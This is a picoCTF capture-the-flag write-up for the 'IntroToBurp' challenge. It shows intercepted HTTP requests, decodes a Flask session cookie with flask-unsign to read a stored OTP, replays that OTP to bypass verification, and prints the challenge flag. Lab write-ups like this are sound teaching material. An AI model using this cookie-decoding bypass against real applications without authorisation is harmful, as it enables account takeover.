---
title: "PicoCTF - IntroToBurp"
author: r2cook
categories:
  - PicoCTF
tags:
  - flask
  - flask-unsign
  - OTP
render_with_liquid: false
media_subpath: /images/picoctf/
image:
  path: room_card.png
---

# IntroToBurp – picoCTF Writeup

**Platform:** picoCTF  
**Category:** Web Exploitation  
**Difficulty:** Easy  
**Challenge:** IntroToBurp

---

# Description

The challenge provides a simple web application and asks us to find the flag.

Target URL:

```
http://titan.picoctf.net:65325
```

The goal is to analyze the authentication flow using an intercepting proxy and identify a weakness that allows bypassing the OTP verification.

---

# Initial Reconnaissance

The first step was to intercept the registration request using **Burp Suite**.

After submitting the registration form, the following HTTP request was captured:

```http
POST / HTTP/1.1
Host: titan.picoctf.net:65325
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 200
Origin: http://titan.picoctf.net:65325
Connection: keep-alive
Referer: http://titan.picoctf.net:65325/
Cookie: session=.eJw1jEEOwiAQRe_CugugMICXIYBDNLbQQIkxxrs7Vl29-e_nz5Ol6_5gpy8mlnrLfq83LORQqmiTQGMgcgfRCFBBW4hOodSkeEjWSqBdHsviS1iRZvngxOq-UZqVdIpT3ELv99rO5P6n-OhLLejLWCM2qrjgoGepnaFudGy_p-Pg6w1FSDU0.abczHA.OfaXSPzhoh274PyVA5WzYVW-lHw
Upgrade-Insecure-Requests: 1
Priority: u=0, i

csrf_token=ImUyNGI4YzFlNzc2YjA5NmI3MTY0YTU4NmI5NGUyNWIwOTBhYzg4MjYi.abc2kg.g5Yv9oMVGRRzxvlSXAR31Y3KmJU&full_name=fname&username=uname&phone_number=0103265984&city=city&password=passord&submit=Register
```

After sending the request, the server responded with a **302 redirect**.

```http
HTTP/1.1 302 FOUND
Server: Werkzeug/3.0.1 Python/3.8.10
Date: Sun, 15 Mar 2026 23:03:16 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 207
Location: /dashboard
Vary: Cookie
Set-Cookie: session=.eJwtjM0OwiAQhN-Fcw-wAgVfhgAu0dhCw08aY3x3t9XTzHyTmTeLj_5i159MLLaaXC9PzMQQZDBR4DzrwK0Os9DSK6ODlQiKEPfRGNC0S2NZXPYr0iydOrHSN0qKgwROcfOt7aXeiB32cATvJaPLYw1YqeCCX0ArayR1o2H9X45TP1_WFjSD.abc6tA.FdQ_OPej2jTofyoKsfUKUwp2Sow; HttpOnly; Path=/
Connection: close

<!doctype html>
<html lang=en>
<title>Redirecting...</title>
<h1>Redirecting...</h1>
<p>You should be redirected automatically to the target URL: <a href="/dashboard">/dashboard</a>. If not, click the link.

```

The response indicated that the user should be redirected to `/dashboard`.

The `Server` header reveals that the application is running **Werkzeug**, which strongly suggests a backend built using **Flask**.

---

# Observing the OTP Verification

When accessing `/dashboard`, the application asks for a **One-Time Password (OTP)**.

Intercepting the OTP submission shows the following request:

```http
POST /dashboard HTTP/1.1
Host: titan.picoctf.net:65325
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 10
Origin: http://titan.picoctf.net:65325
Connection: keep-alive
Referer: http://titan.picoctf.net:65325/dashboard
Cookie: session=.eJwtjEEOwiAURO_CugtA-ICXIYCfaGyhgZLGGO_ub3U1M28y82bpsb3Y9ScTS71lv9UnFmIoVbRJoDEQuYNoBKigLUSnUGpCPCRrJdAuj3n2JSxIs3zqxOq2UtLKgdEU19D7XtuN2GEPR_BeC_oyloiNCi74RYJ2VlE3Orb_5Tj18wXcpTSa.abc2_A.3nas_kcM3FErskMmGKJySmctwo8
Upgrade-Insecure-Requests: 1
Priority: u=0, i

otp=549675
```

Entering a random OTP results in an **Invalid OTP** response.

At this point, the authentication logic appears to rely on a server-generated OTP stored somewhere in the session.

---

# Session Cookie Analysis

The session cookie returned by the server has the following structure:

```css
.eJwtjEEOwiAURO_CugtA-ICXIYCfaGyhgZLGGO_ub3U1M28y82bpsb3Y9ScTS71lv9UnFmIoVbRJoDEQuYNoBKigLUSnUGpCPCRrJdAuj3n2JSxIs3zqxOq2UtLKgdEU19D7XtuN2GEPR_BeC_oyloiNCi74RYJ2VlE3Orb_5Tj18wXcpTSa.abc2_A.3nas_kcM3FErskMmGKJySmctwo8
```

This structure matches the default **Flask session cookie format**, which is:

```sql
data.timestamp.signature
```

Flask stores session data client-side using signed cookies.

These cookies are encoded using:

1. JSON serialization
    
2. zlib compression
    
3. Base64 encoding
    
4. cryptographic signing
    

To decode the cookie, we can use the tool:

**flask-unsign**

---

# Decoding the Flask Session

Running the following command:

```shell
flask-unsign --decode --cookie '<SESSION_COOKIE>'
```
{: .nolineno }

Produces the decoded session data:

```json
{
  "city": "city",
  "csrf_token": "e24b8c1e776b096b7164a586b94e25b090ac8826",
  "full_name": "fname",
  "otp": "549675",
  "password": "passord",
  "phone_number": "0103265984",
  "username": "uname"
}
```

The critical observation here is that **the OTP is stored inside the client-side session cookie**.

Because the cookie can be decoded without the secret key, we can read the OTP directly.

---

# Exploitation

Now that the OTP is known, we can submit it directly.

Intercept the request and replace the OTP value with the one extracted from the session cookie:

```http
POST /dashboard HTTP/1.1
Host: titan.picoctf.net:65325
Content-Type: application/x-www-form-urlencoded

otp=549675
```

---

# Server Response

The server accepts the OTP and returns the flag:

```
Welcome, uname you successfully bypassed the OTP request.
Your Flag: picoCTF{#0TP_Bypvss_SuCc3$S_2e80f1fd}
```

---

# Analysis

The vulnerability exists because the application stores **sensitive authentication data (OTP)** inside a **client-side session cookie**.

Although the cookie is signed, it is not encrypted. This allows attackers to decode the cookie contents and retrieve sensitive values such as the OTP.

As a result, the OTP verification mechanism can be bypassed simply by reading the OTP from the session cookie.

---

# Key Idea

Client-side session storage exposed the OTP value, allowing the authentication step to be bypassed.

---